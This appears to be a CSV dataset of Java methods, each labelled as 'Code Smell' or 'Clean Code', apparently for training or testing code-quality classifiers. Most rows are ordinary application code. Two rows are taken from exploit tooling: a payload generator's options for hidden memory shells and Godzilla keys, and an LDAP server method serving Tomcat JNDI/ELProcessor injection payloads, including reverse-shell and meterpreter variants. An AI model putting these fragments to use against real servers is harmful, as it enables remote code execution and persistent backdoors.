text,label,text_label
"public static void init(String[] args) throws Exception {
  final Options options=getOptions();
  CommandLineParser parser=new DefaultParser();
  try {
    cmdLine=parser.parse(options,args);
  }
 catch (  Exception e) {
    System.out.println(""[*] Parameter input error, please use -h for more information"");
    System.exit(1);
  }
  if (cmdLine.hasOption(""inherit"")) {
    Config.IS_INHERIT_ABSTRACT_TRANSLET=true;
  }
  if (cmdLine.hasOption(""obscure"")) {
    Config.IS_OBSCURE=true;
  }
  if (cmdLine.hasOption(""cmd-header"")) {
    Config.CMD_HEADER_STRING=cmdLine.getOptionValue(""cmd-header"");
  }
  if (cmdLine.hasOption(""url"")) {
    String url=cmdLine.getOptionValue(""url"");
    if (!url.startsWith(""/"")) {
      url=""/"" + url;
    }
    Config.URL_PATTERN=url;
  }
  if (cmdLine.hasOption(""define-class-from-parameter"")) {
    Config.PARAMETER=cmdLine.getOptionValue(""define-class-from-parameter"");
  }
  if (cmdLine.hasOption(""file"")) {
    Config.WRITE_FILE=true;
    Config.FILE=cmdLine.getOptionValue(""file"");
  }
  if (cmdLine.hasOption(""password"")) {
    Config.PASSWORD_ORI=cmdLine.getOptionValue(""password"");
    Config.PASSWORD=generatePassword(Config.PASSWORD_ORI);
  }
  if (cmdLine.hasOption(""godzilla-key"")) {
    Config.GODZILLA_KEY=generatePassword(cmdLine.getOptionValue(""godzilla-key""));
  }
  if (cmdLine.hasOption(""header-key"")) {
    Config.HEADER_KEY=cmdLine.getOptionValue(""header-key"");
  }
  if (cmdLine.hasOption(""header-value"")) {
    Config.HEADER_VALUE=cmdLine.getOptionValue(""header-value"");
  }
  if (cmdLine.hasOption(""no-com-sun"")) {
    Config.FORCE_USING_ORG_APACHE_TEMPLATESIMPL=true;
  }
  if (cmdLine.hasOption(""mozilla-class-loader"")) {
    Config.USING_MOZILLA_DEFININGCLASSLOADER=true;
  }
  if (cmdLine.hasOption(""rhino"")) {
    Config.USING_RHINO=true;
  }
  if (cmdLine.hasOption(""utf8-Overlong-Encoding"")) {
    Config.IS_UTF_Bypass=true;
  }
  if (cmdLine.hasOption(""gen-mem-shell"")) {
    Config.GEN_MEM_SHELL=true;
    if (cmdLine.hasOption(""gen-mem-shell-name"")) {
      Config.GEN_MEM_SHELL_FILENAME=cmdLine.getOptionValue(""gen-mem-shell-name"");
    }
  }
  if (cmdLine.hasOption(""hide-mem-shell"")) {
    Config.HIDE_MEMORY_SHELL=true;
    if (cmdLine.hasOption(""hide-type"")) {
      Config.HIDE_MEMORY_SHELL_TYPE=Integer.parseInt(cmdLine.getOptionValue(""hide-type""));
    }
  }
}",1,Code Smell
"private void updateVideoPlayerTime(){
  Arrays.fill(videoPlayerCurrentTime,0);
  Arrays.fill(videoPlayerTotalTime,0);
  if (videoPlayer != null) {
    long current=Math.max(0,videoPlayer.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,videoPlayer.getDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
 else   if (photoViewerWebView != null && photoViewerWebView.isControllable()) {
    long current=Math.max(0,photoViewerWebView.getCurrentPosition());
    if (shownControlsByEnd && !actionBarWasShownBeforeByEnd) {
      current=0;
    }
    long total=Math.max(0,photoViewerWebView.getVideoDuration());
    if (!inPreview && videoTimelineViewContainer.getVisibility() == View.VISIBLE) {
      total*=(videoTimelineView.getRightProgress() - videoTimelineView.getLeftProgress());
      current-=videoTimelineView.getLeftProgress() * total;
      if (current > total) {
        current=total;
      }
    }
    current/=1000;
    total/=1000;
    videoPlayerCurrentTime[0]=(int)(current / 60);
    videoPlayerCurrentTime[1]=(int)(current % 60);
    videoPlayerTotalTime[0]=(int)(total / 60);
    videoPlayerTotalTime[1]=(int)(total % 60);
  }
  String current, total;
  if (videoPlayerCurrentTime[0] >= 60) {
    current=format(videoPlayerCurrentTime[0] / 60,videoPlayerCurrentTime[0] % 60,videoPlayerCurrentTime[1]);
  }
 else {
    current=format(videoPlayerCurrentTime[0],videoPlayerCurrentTime[1]);
  }
  if (videoPlayerTotalTime[0] >= 60) {
    total=format(videoPlayerTotalTime[0] / 60,videoPlayerTotalTime[0] % 60,videoPlayerTotalTime[1]);
  }
 else {
    total=format(videoPlayerTotalTime[0],videoPlayerTotalTime[1]);
  }
  videoPlayerTime.setText(current + "" / "" + total);
  if (!Objects.equals(lastControlFrameDuration,total)) {
    lastControlFrameDuration=total;
    videoPlayerControlFrameLayout.requestLayout();
  }
}",1,Code Smell
"private int readLastScrValue(ExtractorInput input,PositionHolder seekPositionHolder) throws IOException, InterruptedException {
  long inputLength=input.getLength();
  int bytesToSearch=(int)Math.min(TIMESTAMP_SEARCH_BYTES,inputLength);
  long searchStartPosition=inputLength - bytesToSearch;
  if (input.getPosition() != searchStartPosition) {
    seekPositionHolder.position=searchStartPosition;
    return Extractor.RESULT_SEEK;
  }
  packetBuffer.reset(bytesToSearch);
  input.resetPeekPosition();
  input.peekFully(packetBuffer.data,0,bytesToSearch);
  lastScrValue=readLastScrValueFromBuffer(packetBuffer);
  isLastScrValueRead=true;
  return Extractor.RESULT_CONTINUE;
}",0,Clean Code
"@Override public void sendResult(InMemoryInterceptedSearchResult result,String base) throws Exception {
  System.out.println(""[+] Sending LDAP ResourceRef result for "" + base + "" with javax.el.ELProcessor payload"");
  Entry e=new Entry(base);
  e.addAttribute(""javaClassName"",""java.lang.String"");
  ResourceRef ref=new ResourceRef(""javax.el.ELProcessor"",null,"""","""",true,""org.apache.naming.factory.BeanFactory"",null);
  ref.add(new StringRefAddr(""forceString"",""x=eval""));
  TomcatBypassHelper helper=new TomcatBypassHelper();
  String code=null;
switch (type) {
case dnslog:
    code=helper.getDnsRequestCode(params[0]);
  break;
case command:
code=helper.getExecCode(params[0]);
break;
case reverseshell:
code=helper.getReverseShellCode(params[0],params[1]);
break;
case tomcatecho:
code=helper.injectTomcatEcho();
break;
case springecho:
code=helper.injectSpringEcho();
break;
case tomcatmemshell1:
code=helper.injectTomcatMemshell1();
break;
case tomcatmemshell2:
code=helper.injectTomcatMemshell2();
break;
case springmemshell:
code=helper.injectSpringMemshell();
break;
case tomcatmemshell3:
code=helper.injectmemshell3();
break;
case issuccess:
code=helper.injectSuccess();
break;
case godzillamemshell:
code=helper.injectGodzilla();
break;
case meterpreter:
code=helper.injectMeterpreter();
break;
}
String finalPayload=payloadTemplate.replace(""{replacement}"",code);
ref.add(new StringRefAddr(""x"",finalPayload));
e.addAttribute(""javaSerializedData"",Util.serialize(ref));
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0,ResultCode.SUCCESS));
}",1,Code Smell
"/** 
 * Query group's offset records stored in broker.
 * @param msgStore       history offset store
 * @param groupName      group name
 * @param requestOffset  request offset
 * @param recordStamp    record timestamp
 * @param msgCount       at most record count
 * @param maxRetryCnt    max query turns
 * @param strBuff        string buffer
 */
private void queryGroupStoredOffsets(MessageStore msgStore,String groupName,long requestOffset,long recordStamp,int msgCount,int maxRetryCnt,StringBuilder strBuff){
  int msgTypeCode;
  int partitionId;
  int msgAccCnt=0;
  boolean msgMatched;
  Throwable qryThrow;
  GetMessageResult getMessageResult;
  msgTypeCode=groupName.hashCode();
  partitionId=Math.abs(msgTypeCode) % TServerConstants.OFFSET_HISTORY_NUMPARTS;
  Set<String> filterCodes=new HashSet<>();
  filterCodes.add(groupName);
  ConsumerNodeInfo consumerNodeInfo=new ConsumerNodeInfo(broker.getStoreManager(),groupName,""offsetConsumer"",filterCodes,"""",System.currentTimeMillis(),"""","""");
  int qryRetryCount=0;
  long itemInitOffset=requestOffset;
  int maxTransferSize=broker.getStoreManager().getMaxMsgTransferSize();
  do {
    qryThrow=null;
    try {
      getMessageResult=msgStore.getMessages(303,itemInitOffset,partitionId,consumerNodeInfo,TServerConstants.OFFSET_HISTORY_NAME,maxTransferSize,recordStamp);
    }
 catch (    Throwable e2) {
      qryThrow=e2;
      continue;
    }
    if (getMessageResult.transferedMessageList == null || getMessageResult.transferedMessageList.isEmpty()) {
      itemInitOffset+=getMessageResult.lastReadOffset;
      continue;
    }
    msgMatched=false;
    List<Message> messageList=DataConverterUtil.convertMessage(TServerConstants.OFFSET_HISTORY_NAME,getMessageResult.transferedMessageList);
    for (    Message message : messageList) {
      if (message == null) {
        continue;
      }
      if (!groupName.equals(message.getAttrValue(TServerConstants.TOKEN_OFFSET_GROUP))) {
        continue;
      }
      msgMatched=true;
      if (msgAccCnt++ == 0) {
        strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":true,\""errMsg\"":\""ok\"",\""records\"":["").append(StringUtils.newStringUtf8(message.getData()));
      }
 else {
        strBuff.append("","").append(StringUtils.newStringUtf8(message.getData()));
      }
      if (msgAccCnt >= msgCount) {
        break;
      }
    }
    if (msgMatched) {
      break;
    }
    itemInitOffset+=getMessageResult.lastReadOffset;
  }
 while (++qryRetryCount < maxRetryCnt);
  if (msgAccCnt > 0) {
    strBuff.append(""],\""recordCount\"":"").append(msgAccCnt).append(""}"");
  }
 else {
    if (qryThrow == null) {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Could not find record!\""}"");
    }
 else {
      strBuff.append(""{\""groupName\"":\"""").append(groupName).append(""\"",\""result\"":false,\""errMsg\"":\""Get Message failure: "").append(qryThrow.getMessage()).append(""\""}"");
    }
  }
}",1,Code Smell
"private static void validateNoCyclesStep(Set<ClassQName> alreadySeen,MethodInfo method,boolean includeHolder){
  Set<ClassQName> outgoing=new HashSet<>();
  if (includeHolder) {
    outgoing.add(new ClassQName(method.getDeclaringClass()));
  }
  for (  ParameterInfo ppi : method.getParameters()) {
    outgoing.add(new ClassQName(ppi.getType()));
  }
  if (outgoing.isEmpty()) {
    return;
  }
  Set<ClassQName> currentSeen=new HashSet<>();
  currentSeen.addAll(alreadySeen);
  for (  ClassQName ci : outgoing) {
    if (!currentSeen.add(ci)) {
      throw new GenerationException(""@"" + State.class.getSimpleName() + "" dependency cycle is detected: ""+ ci.ci.getQualifiedName()+ "" ""+ currentSeen,method);
    }
    Set<ClassQName> nextSeen=new HashSet<>();
    nextSeen.addAll(alreadySeen);
    nextSeen.add(ci);
    for (    MethodInfo mi : BenchmarkGeneratorUtils.getAllMethods(ci.ci)) {
      if (mi.getAnnotation(Setup.class) != null || mi.getAnnotation(TearDown.class) != null) {
        validateNoCyclesStep(nextSeen,mi,false);
      }
    }
  }
}
",1,Code Smell
"/** 
 * @hide 
 */
@Override public CharSequence getText(int id) throws NotFoundException {
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(id);
}
/** 
 * @hide 
 */
@Override public CharSequence getText(int id,CharSequence def){
  Object replacement=getReplacement(id);
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId,def);
  }
  return super.getText(id,def);
}
@Override public CharSequence getText(int index){
  Object replacement=((XResources)getResources()).getReplacement(getResourceId(index,0));
  if (replacement instanceof CharSequence) {
    return (CharSequence)replacement;
  }
 else   if (replacement instanceof XResForwarder) {
    Resources repRes=((XResForwarder)replacement).getResources();
    int repId=((XResForwarder)replacement).getId();
    return repRes.getText(repId);
  }
  return super.getText(index);
}",0,Clean Code
"private static Class<?> hasType(Class<?> clz){
  try {
    if (clz.equals(Boolean.class)) {
      return boolean.class;
    }
    if (clz.equals(Integer.class)) {
      return int.class;
    }
    if (clz.equals(Long.class)) {
      return long.class;
    }
    if (clz.equals(Byte.class)) {
      return byte.class;
    }
    if (clz.equals(Short.class)) {
      return short.class;
    }
    if (clz.equals(Float.class)) {
      return float.class;
    }
    if (clz.equals(Double.class)) {
      return double.class;
    }
    if (clz.equals(Character.class)) {
      return char.class;
    }
    return null;
  }
 catch (  Exception e) {
    return null;
  }
}
",0,Clean Code
"public int getMenuLeft(View content,int page){
  if (mMode == SlidingMenu.LEFT) {
switch (page) {
case 0:
      return content.getLeft() - getBehindWidth();
case 2:
    return content.getLeft();
}
}
 else if (mMode == SlidingMenu.RIGHT) {
switch (page) {
case 0:
  return content.getLeft();
case 2:
return content.getLeft() + getBehindWidth();
}
}
 else if (mMode == SlidingMenu.LEFT_RIGHT) {
switch (page) {
case 0:
return content.getLeft() - getBehindWidth();
case 2:
return content.getLeft() + getBehindWidth();
}
}
return content.getLeft();
}",0,Clean Code
"public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children){
  setupWithBottomNavigationView(bottomNavigationView,groupScene,containerId,children,null);
}
public static void setupWithBottomNavigationView(@NonNull final BottomNavigationView bottomNavigationView,@NonNull final GroupScene groupScene,@IdRes final int containerId,@NonNull final LinkedHashMap<Integer,Scene> children,@Nullable final BottomNavigationView.OnNavigationItemSelectedListener onNavigationItemSelectedListener){
  if (children.size() == 0) {
    throw new IllegalArgumentException(""children can't be empty"");
  }
  final List<String> menuIdList=new ArrayList<>();
  int menuSize=bottomNavigationView.getMenu().size();
  for (int i=0; i < menuSize; i++) {
    menuIdList.add(String.valueOf(bottomNavigationView.getMenu().getItem(i).getItemId()));
  }
  bottomNavigationView.setOnNavigationItemSelectedListener(new BottomNavigationView.OnNavigationItemSelectedListener(){
    @Override public boolean onNavigationItemSelected(    @NonNull MenuItem item){
      if (onNavigationItemSelectedListener != null) {
        onNavigationItemSelectedListener.onNavigationItemSelected(item);
      }
      item.setChecked(true);
      String tag=String.valueOf(item.getItemId());
      Scene scene=groupScene.findSceneByTag(tag);
      if (scene == null) {
        scene=children.get(item.getItemId());
      }
      if (!groupScene.isAdded(scene)) {
        groupScene.add(containerId,scene,tag);
      }
 else       if (!groupScene.isShowing(scene)) {
        groupScene.show(scene);
      }
      for (int i=0; i < menuIdList.size(); i++) {
        Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
        if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
          groupScene.hide(otherScene);
        }
      }
      return true;
    }
  }
);
  Map.Entry<Integer,Scene> firstItem=children.entrySet().iterator().next();
  String tag=String.valueOf(firstItem.getKey());
  Scene scene=groupScene.findSceneByTag(tag);
  if (scene == null) {
    scene=firstItem.getValue();
  }
  if (!groupScene.isAdded(scene)) {
    groupScene.add(containerId,scene,tag);
  }
 else   if (!groupScene.isShowing(scene)) {
    groupScene.show(scene);
  }
  for (int i=0; i < menuIdList.size(); i++) {
    Scene otherScene=groupScene.findSceneByTag(menuIdList.get(i));
    if (otherScene != null && otherScene != scene && groupScene.isAdded(otherScene) && groupScene.isShowing(otherScene)) {
      groupScene.hide(otherScene);
    }
  }
  bottomNavigationView.getMenu().findItem(firstItem.getKey()).setChecked(true);
}",1,Code Smell
"private void openAddMember(){
  Bundle args=new Bundle();
  args.putBoolean(""addToGroup"",true);
  args.putLong(""chatId"",currentChat.id);
  GroupCreateActivity fragment=new GroupCreateActivity(args);
  fragment.setInfo(chatInfo);
  if (chatInfo != null && chatInfo.participants != null) {
    LongSparseArray<TLObject> users=new LongSparseArray<>();
    for (int a=0; a < chatInfo.participants.participants.size(); a++) {
      users.put(chatInfo.participants.participants.get(a).user_id,null);
    }
    fragment.setIgnoreUsers(users);
  }
  fragment.setDelegate((users,fwdCount) -> {
    HashSet<Long> currentParticipants=new HashSet<>();
    ArrayList<TLRPC.User> addedUsers=new ArrayList<>();
    if (chatInfo.participants.participants != null) {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        currentParticipants.add(chatInfo.participants.participants.get(i).user_id);
      }
    }
    getMessagesController().addUsersToChat(currentChat,ProfileActivity.this,users,fwdCount,user -> {
      addedUsers.add(user);
    }
,restrictedUser -> {
      for (int i=0; i < chatInfo.participants.participants.size(); i++) {
        if (chatInfo.participants.participants.get(i).user_id == restrictedUser.id) {
          chatInfo.participants.participants.remove(i);
          updateListAnimated(true);
          break;
        }
      }
    }
,() -> {
      int N=addedUsers.size();
      int[] finished=new int[1];
      for (int a=0; a < N; a++) {
        TLRPC.User user=addedUsers.get(a);
        if (!currentParticipants.contains(user.id)) {
          if (chatInfo.participants == null) {
            chatInfo.participants=new TLRPC.TL_chatParticipants();
          }
          if (ChatObject.isChannel(currentChat)) {
            TLRPC.TL_chatChannelParticipant channelParticipant1=new TLRPC.TL_chatChannelParticipant();
            channelParticipant1.channelParticipant=new TLRPC.TL_channelParticipant();
            channelParticipant1.channelParticipant.inviter_id=getUserConfig().getClientUserId();
            channelParticipant1.channelParticipant.peer=new TLRPC.TL_peerUser();
            channelParticipant1.channelParticipant.peer.user_id=user.id;
            channelParticipant1.channelParticipant.date=getConnectionsManager().getCurrentTime();
            channelParticipant1.user_id=user.id;
            chatInfo.participants.participants.add(channelParticipant1);
          }
 else {
            TLRPC.ChatParticipant participant=new TLRPC.TL_chatParticipant();
            participant.user_id=user.id;
            participant.inviter_id=getAccountInstance().getUserConfig().clientUserId;
            chatInfo.participants.participants.add(participant);
          }
          chatInfo.participants_count++;
          getMessagesController().putUser(user,false);
        }
      }
      updateListAnimated(true);
    }
);
  }
);
  presentFragment(fragment);
}",1,Code Smell
"private static int cloneBlocks(BoundingBox sourceArea,ServerLevel world,BlockPos diffToTarget){
  int blockPastes=0;
  List<StructureTemplate.StructureBlockInfo> blocks=Lists.newArrayList();
  List<StructureTemplate.StructureBlockInfo> beBlocks=Lists.newArrayList();
  for (int z=sourceArea.minZ(); z <= sourceArea.maxZ(); ++z) {
    for (int y=sourceArea.minY(); y <= sourceArea.maxY(); ++y) {
      for (int x=sourceArea.minX(); x <= sourceArea.maxX(); ++x) {
        BlockPos currentPos=new BlockPos(x,y,z);
        BlockPos newPos=currentPos.offset(diffToTarget);
        BlockInWorld cached=new BlockInWorld(world,currentPos,false);
        BlockState state=cached.getState();
        BlockEntity be=world.getBlockEntity(currentPos);
        if (be != null) {
          CompoundTag nbt=be.saveWithFullMetadata();
          beBlocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,nbt));
        }
 else {
          blocks.add(new StructureTemplate.StructureBlockInfo(newPos,state,null));
        }
      }
    }
  }
  List<StructureTemplate.StructureBlockInfo> allBlocks=Lists.newArrayList();
  allBlocks.addAll(blocks);
  allBlocks.addAll(beBlocks);
  List<StructureTemplate.StructureBlockInfo> reverse=Lists.reverse(allBlocks);
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    BlockEntity be=world.getBlockEntity(info.pos());
    Clearable.tryClear(be);
    world.setBlock(info.pos(),Blocks.BARRIER.defaultBlockState(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : allBlocks) {
    if (world.setBlock(info.pos(),info.state(),2))     blockPastes++;
  }
  for (  StructureTemplate.StructureBlockInfo info : beBlocks) {
    BlockEntity be=world.getBlockEntity(info.pos());
    if (be != null && info.nbt() != null) {
      info.nbt().putInt(""x"",info.pos().getX());
      info.nbt().putInt(""y"",info.pos().getY());
      info.nbt().putInt(""z"",info.pos().getZ());
      be.load(info.nbt());
      be.setChanged();
    }
    world.setBlock(info.pos(),info.state(),2);
  }
  for (  StructureTemplate.StructureBlockInfo info : reverse) {
    world.blockUpdated(info.pos(),info.state().getBlock());
  }
  world.getBlockTicks().copyArea(sourceArea,diffToTarget);
  return blockPastes;
}",1,Code Smell
"/** 
 * execute watch event
 */
private synchronized void watchIfNecessary() throws PluginLifeCycleException {
  if (watched.compareAndSet(false,true)) {
    List<EnhanceModel> enhanceModels=getEnhanceModels();
    if (CollectionUtils.isEmpty(enhanceModels)) {
      throw new PluginLifeCycleException(""enhance models is empty, plugin type is "" + identity());
    }
    for (    EnhanceModel em : enhanceModels) {
      EventWatchBuilder.IBuildingForBehavior behavior=null;
      EventWatchBuilder.IBuildingForClass builder4Class=new EventWatchBuilder(watcher).onClass(em.getClassPattern());
      builder4Class.isIncludeBootstrap(em.isIncludeBootstrap());
      if (em.isIncludeSubClasses()) {
        builder4Class=builder4Class.includeSubClasses();
      }
      for (      EnhanceModel.MethodPattern mp : em.getMethodPatterns()) {
        behavior=builder4Class.onBehavior(mp.getMethodName());
        if (ArrayUtils.isNotEmpty(mp.getParameterType())) {
          behavior.withParameterTypes(mp.getParameterType());
        }
        if (ArrayUtils.isNotEmpty(mp.getAnnotationTypes())) {
          behavior.hasAnnotationTypes(mp.getAnnotationTypes());
        }
      }
      if (behavior != null) {
        int watchId=behavior.onWatch(getEventListener(listener),em.getWatchTypes()).getWatchId();
        watchIds.add(watchId);
        log.info(""add watcher success,type={},watcherId={}"",getType().name(),watchId);
      }
    }
  }
}",1,Code Smell
"@Override public List<CrmStatisticsPoolSummaryByDateRespVO> getPoolSummaryByDate(CrmStatisticsCustomerReqVO reqVO){
  reqVO.setUserIds(getUserIds(reqVO));
  if (CollUtil.isEmpty(reqVO.getUserIds())) {
    return Collections.emptyList();
  }
  List<CrmStatisticsPoolSummaryByDateRespVO> customerPutCountList=customerMapper.selectPoolCustomerPutCountByDate(reqVO);
  List<CrmStatisticsPoolSummaryByDateRespVO> customerTakeCountList=customerMapper.selectPoolCustomerTakeCountByDate(reqVO);
  List<LocalDateTime[]> timeRanges=LocalDateTimeUtils.getDateRangeList(reqVO.getTimes()[0],reqVO.getTimes()[1],reqVO.getInterval());
  return convertList(timeRanges,times -> {
    Integer customerPutCount=customerPutCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerPutCount).sum();
    Integer customerTakeCount=customerTakeCountList.stream().filter(vo -> LocalDateTimeUtils.isBetween(times[0],times[1],vo.getTime())).mapToInt(CrmStatisticsPoolSummaryByDateRespVO::getCustomerTakeCount).sum();
    return new CrmStatisticsPoolSummaryByDateRespVO().setTime(LocalDateTimeUtils.formatDateRange(times[0],times[1],reqVO.getInterval())).setCustomerPutCount(customerPutCount).setCustomerTakeCount(customerTakeCount);
  }
);
}",0,Clean Code
"private void createButtons(JPanel topPanel){
  final JPanel buttonPanel=new JPanel(new GridBagLayout());
  this.saveButton=new JButton(""Save"");
  this.saveButton.setMnemonic(KeyEvent.VK_S);
  final GridBagConstraints saveConstraints=createButtonConstraints(0,0);
  this.saveButton.addActionListener(e -> saveConfigValues());
  buttonPanel.add(this.saveButton,saveConstraints);
  this.cancelButton=new JButton(""Cancel"");
  this.cancelButton.setMnemonic(KeyEvent.VK_C);
  this.cancelButton.addActionListener(e -> {
    loadSavedFieldValues();
    enableButtons(false);
  }
);
  final GridBagConstraints cancelConstraints=createButtonConstraints(1,5);
  buttonPanel.add(this.cancelButton,cancelConstraints);
  final GridBagConstraints buttonPanelConstraints=new GridBagConstraints();
  buttonPanelConstraints.gridx=1;
  buttonPanelConstraints.gridwidth=2;
  buttonPanelConstraints.gridy=this.configParameters.size() + 1;
  buttonPanelConstraints.weightx=0.01;
  buttonPanelConstraints.fill=GridBagConstraints.HORIZONTAL;
  topPanel.add(buttonPanel,buttonPanelConstraints);
}",0,Clean Code
"public void onMatch(RelOptRuleCall call){
  final Project topProject=call.rel(0);
  final Project bottomProject=call.rel(1);
  final RelBuilder relBuilder=call.builder();
  final Permutation topPermutation=topProject.getPermutation();
  if (topPermutation != null) {
    if (topPermutation.isIdentity()) {
      return;
    }
    final Permutation bottomPermutation=bottomProject.getPermutation();
    if (bottomPermutation != null) {
      if (bottomPermutation.isIdentity()) {
        return;
      }
      final Permutation product=topPermutation.product(bottomPermutation);
      relBuilder.push(bottomProject.getInput());
      relBuilder.project(relBuilder.fields(product),topProject.getRowType().getFieldNames());
      call.transformTo(relBuilder.build());
      return;
    }
  }
  if (!force) {
    if (RexUtil.isIdentity(topProject.getProjects(),topProject.getInput().getRowType())) {
      return;
    }
  }
  final List<RexNode> newProjects=RelOptUtil.pushPastProject(topProject.getProjects(),bottomProject);
  final RelNode input=bottomProject.getInput();
  if (RexUtil.isIdentity(newProjects,input.getRowType())) {
    if (force || input.getRowType().getFieldNames().equals(topProject.getRowType().getFieldNames())) {
      call.transformTo(input);
      return;
    }
  }
  relBuilder.push(bottomProject.getInput());
  relBuilder.project(newProjects,topProject.getRowType().getFieldNames());
  call.transformTo(relBuilder.build());
}",1,Code Smell
"@Override public void onProcessMessage(V2TIMMessage v2TIMMessage){
  String data=new String(v2TIMMessage.getCustomElem().getData());
  if (!TextUtils.isEmpty(data)) {
    invisibleBean=new InvisibleBean();
    try {
      JSONObject invisibleJson=new JSONObject(data);
      invisibleBean.src=invisibleJson.optString(TUIConstants.TUICustomerServicePlugin.CUSTOMER_SERVICE_BUSINESS_ID_SRC_KEY);
      JSONObject contentJson=invisibleJson.optJSONObject(TUICustomerServiceConstants.CUSTOMER_SERVICE_ITEM_CONTENT);
      if (contentJson != null) {
        invisibleBean.menuSendRuleFlag=contentJson.optInt(InvisibleBean.MENU_SEND_RULE_FLAG);
      }
    }
 catch (    JSONException e) {
      TUIChatLog.e(""InvisibleMessageBean"",""exception e = "" + e);
    }
  }
  if (invisibleBean != null) {
    if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SELECTED)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.satisfaction_evaluation));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_END)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_end));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TIMEOUT)) {
      setExtra(TUIChatService.getAppContext().getString(R.string.session_timeout));
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_EVALUATION_SETTING)) {
      int triggerResult=invisibleBean.menuSendRuleFlag & invisibleBean.RULE_USER_TRIGGER_EVALUATION;
      TUICustomerServicePluginService.getInstance().setCanTriggerEvaluation(triggerResult > 0 ? true : false);
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_TRIGGER_EVALUATION)) {
    }
 else     if (invisibleBean.src.equals(TUIConstants.TUICustomerServicePlugin.BUSINESS_ID_SRC_CUSTOMER_SERVICE_SAY_HELLO)) {
    }
 else {
      String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
      setExtra(text);
    }
  }
 else {
    String text=TUICustomerServicePluginService.getAppContext().getString(com.tencent.qcloud.tuikit.timcommon.R.string.timcommon_no_support_msg);
    setExtra(text);
  }
}",0,Clean Code
